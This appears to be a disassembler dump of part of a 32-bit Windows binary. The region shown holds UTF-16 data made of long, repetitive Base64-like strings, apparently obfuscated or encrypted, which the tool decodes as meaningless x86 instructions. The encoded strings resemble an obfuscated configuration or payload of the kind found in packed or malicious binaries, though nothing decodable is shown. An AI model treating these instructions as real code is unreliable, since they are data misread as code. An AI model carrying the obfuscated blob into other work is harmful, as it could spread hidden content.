1000366a:	00 4f 00             	add    %cl,0x0(%edi)
1000366d:	55                   	push   %ebp
1000366e:	00 35 00 77 00 54    	add    %dh,0x54007700
10003674:	00 47 00             	add    %al,0x0(%edi)
10003677:	52                   	push   %edx
10003678:	00 34 00             	add    %dh,(%eax,%eax,1)
1000367b:	54                   	push   %esp
1000367c:	00 6b 00             	add    %ch,0x0(%ebx)
1000367f:	52                   	push   %edx
10003680:	00 51 00             	add    %dl,0x0(%ecx)
10003683:	57                   	push   %edi
10003684:	00 44 00 6c          	add    %al,0x6c(%eax,%eax,1)
10003688:	00 4f 00             	add    %cl,0x0(%edi)
1000368b:	63 00                	arpl   %eax,(%eax)
1000368d:	46                   	inc    %esi
1000368e:	00 68 00             	add    %ch,0x0(%eax)
10003691:	52                   	push   %edx
10003692:	00 5a 00             	add    %bl,0x0(%edx)
10003695:	30 00                	xor    %al,(%eax)
10003697:	78 00                	js     0x10003699
10003699:	6b 00 65             	imul   $0x65,(%eax),%eax
1000369c:	00 45 00             	add    %al,0x0(%ebp)
1000369f:	35 00 45 00 55       	xor    $0x55004500,%eax
100036a4:	00 46 00             	add    %al,0x0(%esi)
100036a7:	67 00 35             	add    %dh,(%di)
100036aa:	00 54 00 6e          	add    %dl,0x6e(%eax,%eax,1)
100036ae:	00 42 00             	add    %al,0x0(%edx)
100036b1:	4d                   	dec    %ebp
100036b2:	00 5a 00             	add    %bl,0x0(%edx)
100036b5:	48                   	dec    %eax
100036b6:	00 68 00             	add    %ch,0x0(%eax)
100036b9:	4f                   	dec    %edi
100036ba:	00 52 00             	add    %dl,0x0(%edx)
100036bd:	46                   	inc    %esi
100036be:	00 42 00             	add    %al,0x0(%edx)
100036c1:	59                   	pop    %ecx
100036c2:	00 4f 00             	add    %cl,0x0(%edi)
100036c5:	55                   	push   %ebp
100036c6:	00 35 00 77 00 59    	add    %dh,0x59007700
100036cc:	00 30                	add    %dh,(%eax)
100036ce:	00 68 00             	add    %ch,0x0(%eax)
100036d1:	4b                   	dec    %ebx
100036d2:	00 54 00 47          	add    %dl,0x47(%eax,%eax,1)
100036d6:	00 52 00             	add    %dl,0x0(%edx)
100036d9:	34 00                	xor    $0x0,%al
100036db:	54                   	push   %esp
100036dc:	00 6b 00             	add    %ch,0x0(%ebx)
100036df:	52                   	push   %edx
100036e0:	00 51 00             	add    %dl,0x0(%ecx)
100036e3:	57                   	push   %edi
100036e4:	00 44 00 6c          	add    %al,0x6c(%eax,%eax,1)
100036e8:	00 4f 00             	add    %cl,0x0(%edi)
100036eb:	63 00                	arpl   %eax,(%eax)
100036ed:	45                   	inc    %ebp
100036ee:	00 78 00             	add    %bh,0x0(%eax)
100036f1:	6b 00 65             	imul   $0x65,(%eax),%eax
100036f4:	00 45 00             	add    %al,0x0(%ebp)
100036f7:	35 00 45 00 55       	xor    $0x55004500,%eax
100036fc:	00 46 00             	add    %al,0x0(%esi)
100036ff:	67 00 35             	add    %dh,(%di)
10003702:	00 54 00 6e          	add    %dl,0x6e(%eax,%eax,1)
10003706:	00 42 00             	add    %al,0x0(%edx)
10003709:	32 00                	xor    (%eax),%al
1000370b:	57                   	push   %edi
1000370c:	00 54 00 4a          	add    %dl,0x4a(%eax,%eax,1)
10003710:	00 4d 00             	add    %cl,0x0(%ebp)
10003713:	5a                   	pop    %edx
10003714:	00 48 00             	add    %cl,0x0(%eax)
10003717:	68 00 4f 00 52       	push   $0x52004f00
1000371c:	00 46 00             	add    %al,0x0(%esi)
1000371f:	42                   	inc    %edx
10003720:	00 59 00             	add    %bl,0x0(%ecx)
10003723:	4f                   	dec    %edi
10003724:	00 55 00             	add    %dl,0x0(%ebp)
10003727:	35 00 77 00 54       	xor    $0x54007700,%eax
1000372c:	00 47 00             	add    %al,0x0(%edi)
1000372f:	52                   	push   %edx
10003730:	00 34 00             	add    %dh,(%eax,%eax,1)
10003733:	54                   	push   %esp
10003734:	00 6b 00             	add    %ch,0x0(%ebx)
10003737:	52                   	push   %edx
10003738:	00 51 00             	add    %dl,0x0(%ecx)
1000373b:	57                   	push   %edi
1000373c:	00 44 00 6c          	add    %al,0x6c(%eax,%eax,1)
10003740:	00 4f 00             	add    %cl,0x0(%edi)
10003743:	63 00                	arpl   %eax,(%eax)
10003745:	46                   	inc    %esi
10003746:	00 5a 00             	add    %bl,0x0(%edx)
10003749:	36 00 59 00          	add    %bl,%ss:0x0(%ecx)
1000374d:	30 00                	xor    %al,(%eax)
1000374f:	78 00                	js     0x10003751
10003751:	6b 00 65             	imul   $0x65,(%eax),%eax
10003754:	00 45 00             	add    %al,0x0(%ebp)
10003757:	35 00 45 00 55       	xor    $0x55004500,%eax
1000375c:	00 46 00             	add    %al,0x0(%esi)
1000375f:	67 00 35             	add    %dh,(%di)
10003762:	00 54 00 6e          	add    %dl,0x6e(%eax,%eax,1)
10003766:	00 42 00             	add    %al,0x0(%edx)
10003769:	4d                   	dec    %ebp
1000376a:	00 5a 00             	add    %bl,0x0(%edx)
1000376d:	48                   	dec    %eax
1000376e:	00 68 00             	add    %ch,0x0(%eax)
10003771:	4f                   	dec    %edi
10003772:	00 52 00             	add    %dl,0x0(%edx)
10003775:	46                   	inc    %esi
10003776:	00 42 00             	add    %al,0x0(%edx)
10003779:	59                   	pop    %ecx
1000377a:	00 4f 00             	add    %cl,0x0(%edi)
1000377d:	55                   	push   %ebp
1000377e:	00 35 00 77 00 64    	add    %dh,0x64007700
10003784:	00 7a 00             	add    %bh,0x0(%edx)
10003787:	30 00                	xor    %al,(%eax)
10003789:	39 00                	cmp    %eax,(%eax)
1000378b:	54                   	push   %esp
1000378c:	00 47 00             	add    %al,0x0(%edi)
1000378f:	52                   	push   %edx
10003790:	00 34 00             	add    %dh,(%eax,%eax,1)
10003793:	54                   	push   %esp
10003794:	00 6b 00             	add    %ch,0x0(%ebx)
10003797:	52                   	push   %edx
10003798:	00 51 00             	add    %dl,0x0(%ecx)
1000379b:	57                   	push   %edi
1000379c:	00 44 00 6c          	add    %al,0x6c(%eax,%eax,1)
100037a0:	00 4f 00             	add    %cl,0x0(%edi)
100037a3:	63 00                	arpl   %eax,(%eax)
100037a5:	41                   	inc    %ecx
100037a6:	00 3d 00 3d 00 00    	add    %bh,0x3d00
100037ac:	15 4c 00 64 00       	adc    $0x64004c,%eax
100037b1:	78 00                	js     0x100037b3
100037b3:	4e                   	dec    %esi
100037b4:	00 44 00 50          	add    %al,0x50(%eax,%eax,1)
100037b8:	00 58 00             	add    %bl,0x0(%eax)
100037bb:	39 00                	cmp    %eax,(%eax)
100037bd:	4e                   	dec    %esi
100037be:	00 70 00             	add    %dh,0x0(%eax)
100037c1:	00 01                	add    %al,(%ecx)
100037c3:	00 85 c1 52 00 55    	add    %al,0x550052c1(%ebp)
100037c9:	00 31                	add    %dh,(%ecx)
100037cb:	00 77 00             	add    %dh,0x0(%edi)
100037ce:	53                   	push   %ebx
100037cf:	00 6d 00             	add    %ch,0x0(%ebp)
100037d2:	39 00                	cmp    %eax,(%eax)
100037d4:	34 00                	xor    $0x0,%al
100037d6:	56                   	push   %esi
100037d7:	00 6d 00             	add    %ch,0x0(%ebp)
100037da:	70 00                	jo     0x100037dc
100037dc:	79 00                	jns    0x100037de
100037de:	52                   	push   %edx
100037df:	00 31                	add    %dh,(%ecx)
100037e1:	00 4a 00             	add    %cl,0x0(%edx)
100037e4:	74 00                	je     0x100037e6
100037e6:	52                   	push   %edx
100037e7:	00 6b 00             	add    %ch,0x0(%ebx)
100037ea:	56                   	push   %esi
100037eb:	00 4e 00             	add    %cl,0x0(%esi)
100037ee:	63 00                	arpl   %eax,(%eax)
100037f0:	45                   	inc    %ebp
100037f1:	00 70 00             	add    %dh,0x0(%eax)
100037f4:	76 00                	jbe    0x100037f6
100037f6:	65 00 46 00          	add    %al,%gs:0x0(%esi)
100037fa:	5a                   	pop    %edx
100037fb:	00 71 00             	add    %dh,0x0(%ecx)
100037fe:	63 00                	arpl   %eax,(%eax)
10003800:	6b 00 64             	imul   $0x64,(%eax),%eax
10003803:	00 46 00             	add    %al,0x0(%esi)
10003806:	54                   	push   %esp
10003807:	00 58 00             	add    %bl,0x0(%eax)
1000380a:	42                   	inc    %edx
1000380b:	00 4b 00             	add    %cl,0x0(%ebx)
1000380e:	62 00                	bound  %eax,(%eax)
10003810:	33 00                	xor    (%eax),%eax
10003812:	68 00 57 00 61       	push   $0x61005700
10003817:	00 6e 00             	add    %ch,0x0(%esi)
1000381a:	4a                   	dec    %edx
1000381b:	00 48 00             	add    %cl,0x0(%eax)
1000381e:	63 00                	arpl   %eax,(%eax)
10003820:	47                   	inc    %edi
10003821:	00 4a 00             	add    %cl,0x0(%edx)
10003824:	48                   	dec    %eax
10003825:	00 52 00             	add    %dl,0x0(%edx)
10003828:	55                   	push   %ebp
10003829:	00 31                	add    %dh,(%ecx)
1000382b:	00 77 00             	add    %dh,0x0(%edi)
1000382e:	53                   	push   %ebx
1000382f:	00 6d 00             	add    %ch,0x0(%ebp)
10003832:	39 00                	cmp    %eax,(%eax)
10003834:	34 00                	xor    $0x0,%al
10003836:	56                   	push   %esi
10003837:	00 6d 00             	add    %ch,0x0(%ebp)
1000383a:	70 00                	jo     0x1000383c
1000383c:	79 00                	jns    0x1000383e
1000383e:	52                   	push   %edx
1000383f:	00 30                	add    %dh,(%eax)
10003841:	00 56 00             	add    %dl,0x0(%esi)
10003844:	4e                   	dec    %esi
10003845:	00 63 00             	add    %ah,0x0(%ebx)
10003848:	45                   	inc    %ebp
10003849:	00 70 00             	add    %dh,0x0(%eax)
1000384c:	76 00                	jbe    0x1000384e
1000384e:	65 00 46 00          	add    %al,%gs:0x0(%esi)
10003852:	5a                   	pop    %edx
10003853:	00 71 00             	add    %dh,0x0(%ecx)
10003856:	63 00                	arpl   %eax,(%eax)
10003858:	6b 00 64             	imul   $0x64,(%eax),%eax
1000385b:	00 57 00             	add    %dl,0x0(%edi)
1000385e:	61                   	popa
1000385f:	00 30                	add    %dh,(%eax)
10003861:	00 6c 00 46          	add    %ch,0x46(%eax,%eax,1)
10003865:	00 54 00 58          	add    %dl,0x58(%eax,%eax,1)
10003869:	00 42 00             	add    %al,0x0(%edx)
1000386c:	4b                   	dec    %ebx
1000386d:	00 62 00             	add    %ah,0x0(%edx)
10003870:	33 00                	xor    (%eax),%eax
10003872:	68 00 57 00 61       	push   $0x61005700
10003877:	00 6e 00             	add    %ch,0x0(%esi)
1000387a:	4a                   	dec    %edx
1000387b:	00 48 00             	add    %cl,0x0(%eax)
1000387e:	52                   	push   %edx
1000387f:	00 55 00             	add    %dl,0x0(%ebp)
10003882:	31 00                	xor    %eax,(%eax)
10003884:	77 00                	ja     0x10003886
10003886:	53                   	push   %ebx
10003887:	00 6d 00             	add    %ch,0x0(%ebp)
1000388a:	39 00                	cmp    %eax,(%eax)
1000388c:	34 00                	xor    $0x0,%al
1000388e:	56                   	push   %esi
1000388f:	00 6d 00             	add    %ch,0x0(%ebp)
10003892:	70 00                	jo     0x10003894
10003894:	79 00                	jns    0x10003896
10003896:	52                   	push   %edx
10003897:	00 30                	add    %dh,(%eax)
10003899:	00 68 00             	add    %ch,0x0(%eax)
1000389c:	53                   	push   %ebx
1000389d:	00 64 00 6b          	add    %ah,0x6b(%eax,%eax,1)
100038a1:	00 56 00             	add    %dl,0x0(%esi)
100038a4:	4e                   	dec    %esi
100038a5:	00 63 00             	add    %ah,0x0(%ebx)
100038a8:	45                   	inc    %ebp
100038a9:	00 70 00             	add    %dh,0x0(%eax)
100038ac:	76 00                	jbe    0x100038ae
100038ae:	65 00 46 00          	add    %al,%gs:0x0(%esi)
100038b2:	5a                   	pop    %edx
100038b3:	00 71 00             	add    %dh,0x0(%ecx)
100038b6:	63 00                	arpl   %eax,(%eax)
100038b8:	6b 00 64             	imul   $0x64,(%eax),%eax
100038bb:	00 46 00             	add    %al,0x0(%esi)
100038be:	54                   	push   %esp
100038bf:	00 58 00             	add    %bl,0x0(%eax)
100038c2:	42                   	inc    %edx
100038c3:	00 4b 00             	add    %cl,0x0(%ebx)
100038c6:	62 00                	bound  %eax,(%eax)
100038c8:	33 00                	xor    (%eax),%eax
100038ca:	68 00 57 00 61       	push   $0x61005700
100038cf:	00 6e 00             	add    %ch,0x0(%esi)
100038d2:	4a                   	dec    %edx
100038d3:	00 48 00             	add    %cl,0x0(%eax)
100038d6:	53                   	push   %ebx
100038d7:	00 55 00             	add    %dl,0x0(%ebp)
100038da:	68 00 6b 00 52       	push   $0x52006b00
100038df:	00 55 00             	add    %dl,0x0(%ebp)
100038e2:	31 00                	xor    %eax,(%eax)
100038e4:	77 00                	ja     0x100038e6
100038e6:	53                   	push   %ebx
100038e7:	00 6d 00             	add    %ch,0x0(%ebp)
100038ea:	39 00                	cmp    %eax,(%eax)
100038ec:	34 00                	xor    $0x0,%al
100038ee:	56                   	push   %esi
100038ef:	00 6d 00             	add    %ch,0x0(%ebp)
100038f2:	70 00                	jo     0x100038f4
100038f4:	79 00                	jns    0x100038f6
100038f6:	52                   	push   %edx
100038f7:	00 30                	add    %dh,(%eax)
100038f9:	00 56 00             	add    %dl,0x0(%esi)
100038fc:	4e                   	dec    %esi
100038fd:	00 63 00             	add    %ah,0x0(%ebx)
10003900:	45                   	inc    %ebp
10003901:	00 70 00             	add    %dh,0x0(%eax)
10003904:	76 00                	jbe    0x10003906
10003906:	65 00 46 00          	add    %al,%gs:0x0(%esi)
1000390a:	5a                   	pop    %edx
1000390b:	00 71 00             	add    %dh,0x0(%ecx)
1000390e:	63 00                	arpl   %eax,(%eax)
10003910:	6b 00 64             	imul   $0x64,(%eax),%eax
10003913:	00 35 00 59 00 56    	add    %dh,0x56005900
10003919:	00 68 00             	add    %ch,0x0(%eax)
1000391c:	46                   	inc    %esi
1000391d:	00 54 00 58          	add    %dl,0x58(%eax,%eax,1)
10003921:	00 42 00             	add    %al,0x0(%edx)
10003924:	4b                   	dec    %ebx
10003925:	00 62 00             	add    %ah,0x0(%edx)
10003928:	33 00                	xor    (%eax),%eax
1000392a:	68 00 57 00 61       	push   $0x61005700
1000392f:	00 6e 00             	add    %ch,0x0(%esi)
10003932:	4a                   	dec    %edx
10003933:	00 48 00             	add    %cl,0x0(%eax)
10003936:	52                   	push   %edx
10003937:	00 55 00             	add    %dl,0x0(%ebp)
1000393a:	31 00                	xor    %eax,(%eax)
1000393c:	77 00                	ja     0x1000393e
1000393e:	53                   	push   %ebx
1000393f:	00 6d 00             	add    %ch,0x0(%ebp)
10003942:	39 00                	cmp    %eax,(%eax)
10003944:	34 00                	xor    $0x0,%al
10003946:	56                   	push   %esi
10003947:	00 6d 00             	add    %ch,0x0(%ebp)
1000394a:	70 00                	jo     0x1000394c
1000394c:	79 00                	jns    0x1000394e
1000394e:	52                   	push   %edx
1000394f:	00 31                	add    %dh,(%ecx)
10003951:	00 4a 00             	add    %cl,0x0(%edx)
10003954:	73 00                	jae    0x10003956
10003956:	53                   	push   %ebx
10003957:	00 55 00             	add    %dl,0x0(%ebp)
1000395a:	56                   	push   %esi
1000395b:	00 4e 00             	add    %cl,0x0(%esi)
1000395e:	63 00                	arpl   %eax,(%eax)
10003960:	45                   	inc    %ebp
10003961:	00 70 00             	add    %dh,0x0(%eax)
10003964:	76 00                	jbe    0x10003966
10003966:	65 00 46 00          	add    %al,%gs:0x0(%esi)
1000396a:	5a                   	pop    %edx
1000396b:	00 71 00             	add    %dh,0x0(%ecx)
1000396e:	63 00                	arpl   %eax,(%eax)
10003970:	6b 00 64             	imul   $0x64,(%eax),%eax
10003973:	00 46 00             	add    %al,0x0(%esi)
10003976:	54                   	push   %esp
10003977:	00 58 00             	add    %bl,0x0(%eax)
1000397a:	42                   	inc    %edx
1000397b:	00 4b 00             	add    %cl,0x0(%ebx)
1000397e:	62 00                	bound  %eax,(%eax)
10003980:	33 00                	xor    (%eax),%eax
10003982:	68 00 57 00 61       	push   $0x61005700
10003987:	00 6e 00             	add    %ch,0x0(%esi)
1000398a:	4a                   	dec    %edx
1000398b:	00 48 00             	add    %cl,0x0(%eax)
1000398e:	52                   	push   %edx
1000398f:	00 56 00             	add    %dl,0x0(%esi)
10003992:	4a                   	dec    %edx
10003993:	00 52 00             	add    %dl,0x0(%edx)
10003996:	52                   	push   %edx
10003997:	00 55 00             	add    %dl,0x0(%ebp)
1000399a:	31 00                	xor    %eax,(%eax)
1000399c:	77 00                	ja     0x1000399e
1000399e:	53                   	push   %ebx
1000399f:	00 6d 00             	add    %ch,0x0(%ebp)
100039a2:	39 00                	cmp    %eax,(%eax)
100039a4:	34 00                	xor    $0x0,%al
100039a6:	56                   	push   %esi
100039a7:	00 6d 00             	add    %ch,0x0(%ebp)
100039aa:	70 00                	jo     0x100039ac
100039ac:	79 00                	jns    0x100039ae
100039ae:	52                   	push   %edx
100039af:	00 30                	add    %dh,(%eax)
100039b1:	00 56 00             	add    %dl,0x0(%esi)
100039b4:	4e                   	dec    %esi
100039b5:	00 63 00             	add    %ah,0x0(%ebx)
100039b8:	45                   	inc    %ebp
100039b9:	00 70 00             	add    %dh,0x0(%eax)
100039bc:	76 00                	jbe    0x100039be
100039be:	65 00 46 00          	add    %al,%gs:0x0(%esi)
100039c2:	5a                   	pop    %edx
100039c3:	00 71 00             	add    %dh,0x0(%ecx)
100039c6:	63 00                	arpl   %eax,(%eax)
100039c8:	6b 00 64             	imul   $0x64,(%eax),%eax
100039cb:	00 56 00             	add    %dl,0x0(%esi)
100039ce:	4d                   	dec    %ebp
100039cf:	00 6d 00             	add    %ch,0x0(%ebp)
100039d2:	52                   	push   %edx
100039d3:	00 46 00             	add    %al,0x0(%esi)
100039d6:	54                   	push   %esp
100039d7:	00 58 00             	add    %bl,0x0(%eax)
100039da:	42                   	inc    %edx
100039db:	00 4b 00             	add    %cl,0x0(%ebx)
100039de:	62 00                	bound  %eax,(%eax)
100039e0:	33 00                	xor    (%eax),%eax
100039e2:	68 00 57 00 61       	push   $0x61005700
100039e7:	00 6e 00             	add    %ch,0x0(%esi)
100039ea:	4a                   	dec    %edx
100039eb:	00 48 00             	add    %cl,0x0(%eax)
100039ee:	52                   	push   %edx
100039ef:	00 55 00             	add    %dl,0x0(%ebp)
100039f2:	31 00                	xor    %eax,(%eax)
100039f4:	77 00                	ja     0x100039f6
100039f6:	53                   	push   %ebx
100039f7:	00 6d 00             	add    %ch,0x0(%ebp)
100039fa:	39 00                	cmp    %eax,(%eax)
100039fc:	34 00                	xor    $0x0,%al
100039fe:	56                   	push   %esi
100039ff:	00 6d 00             	add    %ch,0x0(%ebp)
10003a02:	70 00                	jo     0x10003a04
10003a04:	79 00                	jns    0x10003a06
10003a06:	52                   	push   %edx
10003a07:	00 32                	add    %dh,(%edx)
10003a09:	00 74 00 68          	add    %dh,0x68(%eax,%eax,1)
10003a0d:	00 52 00             	add    %dl,0x0(%edx)
10003a10:	30 00                	xor    %al,(%eax)
10003a12:	56                   	push   %esi
10003a13:	00 4e 00             	add    %cl,0x0(%esi)
10003a16:	63 00                	arpl   %eax,(%eax)
10003a18:	45                   	inc    %ebp
10003a19:	00 70 00             	add    %dh,0x0(%eax)
10003a1c:	76 00                	jbe    0x10003a1e
10003a1e:	65 00 46 00          	add    %al,%gs:0x0(%esi)
10003a22:	5a                   	pop    %edx
10003a23:	00 71 00             	add    %dh,0x0(%ecx)
10003a26:	63 00                	arpl   %eax,(%eax)
10003a28:	6b 00 64             	imul   $0x64,(%eax),%eax
10003a2b:	00 46 00             	add    %al,0x0(%esi)
10003a2e:	54                   	push   %esp
10003a2f:	00 58 00             	add    %bl,0x0(%eax)
10003a32:	42                   	inc    %edx
10003a33:	00 4b 00             	add    %cl,0x0(%ebx)
10003a36:	62 00                	bound  %eax,(%eax)
10003a38:	33 00                	xor    (%eax),%eax
10003a3a:	68 00 57 00 61       	push   $0x61005700
10003a3f:	00 6e 00             	add    %ch,0x0(%esi)
10003a42:	4a                   	dec    %edx
10003a43:	00 48 00             	add    %cl,0x0(%eax)
10003a46:	52                   	push   %edx
10003a47:	00 6c 00 4e          	add    %ch,0x4e(%eax,%eax,1)
10003a4b:	00 57 00             	add    %dl,0x0(%edi)
10003a4e:	52                   	push   %edx
10003a4f:	00 55 00             	add    %dl,0x0(%ebp)
10003a52:	31 00                	xor    %eax,(%eax)
10003a54:	77 00                	ja     0x10003a56
10003a56:	53                   	push   %ebx
10003a57:	00 6d 00             	add    %ch,0x0(%ebp)
10003a5a:	39 00                	cmp    %eax,(%eax)
10003a5c:	34 00                	xor    $0x0,%al
10003a5e:	56                   	push   %esi
10003a5f:	00 6d 00             	add    %ch,0x0(%ebp)
10003a62:	70 00                	jo     0x10003a64
10003a64:	79 00                	jns    0x10003a66
10003a66:	52                   	push   %edx
10003a67:	00 30                	add    %dh,(%eax)
10003a69:	00 56 00             	add    %dl,0x0(%esi)
10003a6c:	4e                   	dec    %esi
10003a6d:	00 63 00             	add    %ah,0x0(%ebx)
10003a70:	45                   	inc    %ebp
10003a71:	00 70 00             	add    %dh,0x0(%eax)
10003a74:	76 00                	jbe    0x10003a76
10003a76:	65 00 46 00          	add    %al,%gs:0x0(%esi)
10003a7a:	5a                   	pop    %edx
10003a7b:	00 71 00             	add    %dh,0x0(%ecx)
10003a7e:	63 00                	arpl   %eax,(%eax)
10003a80:	6b 00 64             	imul   $0x64,(%eax),%eax
10003a83:	00 59 00             	add    %bl,0x0(%ecx)
10003a86:	61                   	popa
10003a87:	00 45 00             	add    %al,0x0(%ebp)
10003a8a:	4a                   	dec    %edx
10003a8b:	00 46 00             	add    %al,0x0(%esi)
10003a8e:	54                   	push   %esp
10003a8f:	00 58 00             	add    %bl,0x0(%eax)
10003a92:	42                   	inc    %edx
10003a93:	00 4b 00             	add    %cl,0x0(%ebx)
10003a96:	62 00                	bound  %eax,(%eax)
10003a98:	33 00                	xor    (%eax),%eax
10003a9a:	68 00 57 00 61       	push   $0x61005700
10003a9f:	00 6e 00             	add    %ch,0x0(%esi)
10003aa2:	4a                   	dec    %edx
10003aa3:	00 48 00             	add    %cl,0x0(%eax)
10003aa6:	52                   	push   %edx
10003aa7:	00 55 00             	add    %dl,0x0(%ebp)
10003aaa:	31 00                	xor    %eax,(%eax)
10003aac:	77 00                	ja     0x10003aae
10003aae:	53                   	push   %ebx
10003aaf:	00 6d 00             	add    %ch,0x0(%ebp)
10003ab2:	39 00                	cmp    %eax,(%eax)
10003ab4:	34 00                	xor    $0x0,%al
10003ab6:	56                   	push   %esi
10003ab7:	00 6d 00             	add    %ch,0x0(%ebp)
10003aba:	70 00                	jo     0x10003abc
10003abc:	79 00                	jns    0x10003abe
10003abe:	52                   	push   %edx
10003abf:	00 31                	add    %dh,(%ecx)
10003ac1:	00 4d 00             	add    %cl,0x0(%ebp)
10003ac4:	77 00                	ja     0x10003ac6
10003ac6:	4f                   	dec    %edi
10003ac7:	00 55 00             	add    %dl,0x0(%ebp)
10003aca:	56                   	push   %esi
10003acb:	00 4e 00             	add    %cl,0x0(%esi)
10003ace:	63 00                	arpl   %eax,(%eax)
10003ad0:	45                   	inc    %ebp
10003ad1:	00 70 00             	add    %dh,0x0(%eax)
10003ad4:	76 00                	jbe    0x10003ad6
10003ad6:	65 00 46 00          	add    %al,%gs:0x0(%esi)
10003ada:	5a                   	pop    %edx
10003adb:	00 71 00             	add    %dh,0x0(%ecx)
10003ade:	63 00                	arpl   %eax,(%eax)
10003ae0:	6b 00 64             	imul   $0x64,(%eax),%eax
10003ae3:	00 46 00             	add    %al,0x0(%esi)
10003ae6:	54                   	push   %esp
10003ae7:	00 58 00             	add    %bl,0x0(%eax)
10003aea:	42                   	inc    %edx
10003aeb:	00 4b 00             	add    %cl,0x0(%ebx)
10003aee:	62 00                	bound  %eax,(%eax)
10003af0:	33 00                	xor    (%eax),%eax
10003af2:	68 00 57 00 61       	push   $0x61005700
10003af7:	00 6e 00             	add    %ch,0x0(%esi)
10003afa:	4a                   	dec    %edx
10003afb:	00 48 00             	add    %cl,0x0(%eax)
10003afe:	53                   	push   %ebx
10003aff:	00 6c 00 6f          	add    %ch,0x6f(%eax,%eax,1)
10003b03:	00 79 00             	add    %bh,0x0(%ecx)
10003b06:	52                   	push   %edx
10003b07:	00 55 00             	add    %dl,0x0(%ebp)
10003b0a:	31 00                	xor    %eax,(%eax)
10003b0c:	77 00                	ja     0x10003b0e
10003b0e:	53                   	push   %ebx
10003b0f:	00 6d 00             	add    %ch,0x0(%ebp)
10003b12:	39 00                	cmp    %eax,(%eax)
10003b14:	34 00                	xor    $0x0,%al
10003b16:	56                   	push   %esi
10003b17:	00 6d 00             	add    %ch,0x0(%ebp)
10003b1a:	70 00                	jo     0x10003b1c
10003b1c:	79 00                	jns    0x10003b1e
10003b1e:	52                   	push   %edx
10003b1f:	00 30                	add    %dh,(%eax)
10003b21:	00 56 00             	add    %dl,0x0(%esi)
10003b24:	4e                   	dec    %esi
10003b25:	00 63 00             	add    %ah,0x0(%ebx)
10003b28:	45                   	inc    %ebp
10003b29:	00 70 00             	add    %dh,0x0(%eax)
10003b2c:	76 00                	jbe    0x10003b2e
10003b2e:	65 00 46 00          	add    %al,%gs:0x0(%esi)
10003b32:	5a                   	pop    %edx
10003b33:	00 71 00             	add    %dh,0x0(%ecx)
10003b36:	63 00                	arpl   %eax,(%eax)
10003b38:	6b 00 64             	imul   $0x64,(%eax),%eax
10003b3b:	00 6b 00             	add    %ch,0x0(%ebx)
10003b3e:	61                   	popa
10003b3f:	00 30                	add    %dh,(%eax)
10003b41:	00 35 00 46 00 54    	add    %dh,0x54004600
10003b47:	00 58 00             	add    %bl,0x0(%eax)
10003b4a:	42                   	inc    %edx
10003b4b:	00 4b 00             	add    %cl,0x0(%ebx)
10003b4e:	62 00                	bound  %eax,(%eax)
10003b50:	33 00                	xor    (%eax),%eax
10003b52:	68 00 57 00 61       	push   $0x61005700
10003b57:	00 6e 00             	add    %ch,0x0(%esi)
10003b5a:	4a                   	dec    %edx
10003b5b:	00 48 00             	add    %cl,0x0(%eax)
10003b5e:	52                   	push   %edx
10003b5f:	00 55 00             	add    %dl,0x0(%ebp)
10003b62:	31 00                	xor    %eax,(%eax)
10003b64:	77 00                	ja     0x10003b66
10003b66:	53                   	push   %ebx
10003b67:	00 6d 00             	add    %ch,0x0(%ebp)
10003b6a:	39 00                	cmp    %eax,(%eax)
10003b6c:	34 00                	xor    $0x0,%al
10003b6e:	56                   	push   %esi
10003b6f:	00 6d 00             	add    %ch,0x0(%ebp)
10003b72:	70 00                	jo     0x10003b74
10003b74:	79 00                	jns    0x10003b76
10003b76:	52                   	push   %edx
10003b77:	00 32                	add    %dh,(%edx)
10003b79:	00 6c 00 43          	add    %ch,0x43(%eax,%eax,1)
10003b7d:	00 4d 00             	add    %cl,0x0(%ebp)
10003b80:	45                   	inc    %ebp
10003b81:	00 56 00             	add    %dl,0x0(%esi)
10003b84:	4e                   	dec    %esi
10003b85:	00 63 00             	add    %ah,0x0(%ebx)
10003b88:	45                   	inc    %ebp
10003b89:	00 70 00             	add    %dh,0x0(%eax)
10003b8c:	76 00                	jbe    0x10003b8e
10003b8e:	65 00 46 00          	add    %al,%gs:0x0(%esi)
10003b92:	5a                   	pop    %edx
10003b93:	00 71 00             	add    %dh,0x0(%ecx)
10003b96:	63 00                	arpl   %eax,(%eax)
10003b98:	6b 00 64             	imul   $0x64,(%eax),%eax
10003b9b:	00 46 00             	add    %al,0x0(%esi)
10003b9e:	54                   	push   %esp
10003b9f:	00 58 00             	add    %bl,0x0(%eax)
10003ba2:	42                   	inc    %edx
10003ba3:	00 4b 00             	add    %cl,0x0(%ebx)
10003ba6:	62 00                	bound  %eax,(%eax)
10003ba8:	33 00                	xor    (%eax),%eax
10003baa:	68 00 57 00 61       	push   $0x61005700
10003baf:	00 6e 00             	add    %ch,0x0(%esi)
10003bb2:	4a                   	dec    %edx
10003bb3:	00 48 00             	add    %cl,0x0(%eax)
10003bb6:	59                   	pop    %ecx
10003bb7:	00 6e 00             	add    %ch,0x0(%esi)
10003bba:	6c                   	insb   (%dx),%es:(%edi)
10003bbb:	00 43 00             	add    %al,0x0(%ebx)
10003bbe:	52                   	push   %edx
10003bbf:	00 55 00             	add    %dl,0x0(%ebp)
10003bc2:	31 00                	xor    %eax,(%eax)
10003bc4:	77 00                	ja     0x10003bc6
10003bc6:	53                   	push   %ebx
10003bc7:	00 6d 00             	add    %ch,0x0(%ebp)
10003bca:	39 00                	cmp    %eax,(%eax)
10003bcc:	34 00                	xor    $0x0,%al
10003bce:	56                   	push   %esi
10003bcf:	00 6d 00             	add    %ch,0x0(%ebp)
10003bd2:	70 00                	jo     0x10003bd4
10003bd4:	79 00                	jns    0x10003bd6
10003bd6:	52                   	push   %edx
10003bd7:	00 30                	add    %dh,(%eax)
10003bd9:	00 56 00             	add    %dl,0x0(%esi)
10003bdc:	4e                   	dec    %esi
10003bdd:	00 63 00             	add    %ah,0x0(%ebx)
10003be0:	45                   	inc    %ebp
10003be1:	00 70 00             	add    %dh,0x0(%eax)
10003be4:	76 00                	jbe    0x10003be6
10003be6:	65 00 46 00          	add    %al,%gs:0x0(%esi)
10003bea:	5a                   	pop    %edx
10003beb:	00 71 00             	add    %dh,0x0(%ecx)
10003bee:	63 00                	arpl   %eax,(%eax)
10003bf0:	6b 00 64             	imul   $0x64,(%eax),%eax
10003bf3:	00 33                	add    %dh,(%ebx)
10003bf5:	00 59 00             	add    %bl,0x0(%ecx)
10003bf8:	32 00                	xor    (%eax),%al
10003bfa:	31 00                	xor    %eax,(%eax)
10003bfc:	46                   	inc    %esi
10003bfd:	00 54 00 58          	add    %dl,0x58(%eax,%eax,1)
10003c01:	00 42 00             	add    %al,0x0(%edx)
10003c04:	4b                   	dec    %ebx
